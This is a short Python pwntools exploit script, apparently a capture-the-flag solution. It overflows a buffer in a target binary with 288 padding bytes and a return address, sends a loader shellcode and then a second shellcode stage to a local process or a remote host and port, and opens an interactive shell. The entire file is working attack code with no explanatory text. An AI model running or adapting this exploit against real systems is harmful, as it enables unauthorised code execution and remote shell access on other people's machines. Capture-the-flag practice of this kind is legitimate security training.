#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
code = ELF('./main', checksec=False)
context.arch = 'amd64'
context.log_level = 'debug'

def exploit(r):
    os.system('make shellcode')
    sc = read('loader.bin')
    rop = flat(
        'a'*288,
        addr,
        sc,
    )
    r.sendlineafter(': ', rop)
    sc = read('sc.bin')
    nop = '\x00\x01'
    r.send(nop*10 + sc)
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        addr = 0x4000800c70
    else:
        r = process('./run.sh')
        addr = 0x40007ff2b0
    exploit(r)
